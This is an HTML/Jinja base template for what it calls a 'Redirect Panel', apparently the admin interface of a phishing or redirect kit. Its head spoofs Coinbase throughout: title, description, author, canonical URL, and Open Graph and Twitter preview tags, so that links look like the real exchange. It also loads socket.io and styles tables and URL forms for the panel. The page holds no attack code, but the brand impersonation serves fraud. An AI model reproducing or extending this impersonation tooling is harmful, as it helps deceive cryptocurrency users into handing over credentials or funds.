<!DOCTYPE html>
<html>
<head>
    <title>{% block title %}Redirect Panel{% endblock %}</title>
    <meta name="title" content="Coinbase - Secure Cryptocurrency Platform">
    <meta name="description" content="Join the world's most trusted cryptocurrency exchange. Buy, sell, and manage your digital assets with ease.">
    <meta name="keywords" content="coinbase, cryptocurrency, bitcoin, ethereum, crypto exchange, digital assets">
    <meta name="robots" content="index, follow">
    <meta name="language" content="English">
    <meta name="author" content="Coinbase">
    
    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://www.coinbase.com/">
    <meta property="og:title" content="Coinbase - Secure Cryptocurrency Platform">
    <meta property="og:description" content="Join the world's most trusted cryptocurrency exchange. Buy, sell, and manage your digital assets with ease.">
    <meta property="og:image" content="https://www.coinbase.com/og-image.png">
    
    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://www.coinbase.com/">
    <meta property="twitter:title" content="Coinbase - Secure Cryptocurrency Platform">
    <meta property="twitter:description" content="Join the world's most trusted cryptocurrency exchange. Buy, sell, and manage your digital assets with ease.">
    <meta property="twitter:image" content="https://www.coinbase.com/twitter-image.png">
    
    <!-- Favicon -->
    <link rel="icon" type="image/x-icon" href="https://www.coinbase.com/favicon.ico">
    
    <!-- Apple Touch Icon -->
    <link rel="apple-touch-icon" href="https://www.coinbase.com/apple-touch-icon.png">
    
    <!-- Canonical URL -->
    <link rel="canonical" href="https://www.coinbase.com/">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f4f4f4;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        table, th, td {
            border: 1px solid #ddd;
        }
        th, td {
            padding: 12px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
        form {
            margin: 20px 0;
        }
        label {
            display: block;
            margin: 5px 0;
        }
        input[type="text"], input[type="url"] {
            padding: 8px;
            width: 300px;
            margin: 5px 0;
        }
        button {
            padding: 10px 15px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }
        button:hover {
            background: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        {% block content %}{% endblock %}
    </div>
    {% block scripts %}{% endblock %}
</body>
</html>
